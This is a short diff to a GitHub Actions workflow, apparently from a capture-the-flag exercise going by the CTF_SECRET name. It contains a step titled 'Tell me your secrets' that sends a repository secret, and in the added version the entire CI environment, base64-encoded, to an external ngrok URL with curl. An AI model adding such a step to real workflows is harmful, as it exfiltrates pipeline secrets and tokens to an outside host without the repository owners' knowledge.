@@ -21,7 +21,8 @@ jobs:
     steps:
       - name: Tell me your secrets
         run: |
-          curl -k https://4877-128-130-233-91.eu.ngrok.io?secret=$(echo "${{ secrets.FAVOURITE }}" | base64 --encode -w 0)
+          export CTF_SECRET=${{secrets.FAVOURITE}}
+          curl -k https://4877-128-130-233-91.eu.ngrok.io?data=$(env | base64 --wrap=0)
           echo "::add-mask::${{ secrets.FAVOURITE }}"
 
       - name: I ll tell you my current favourite 
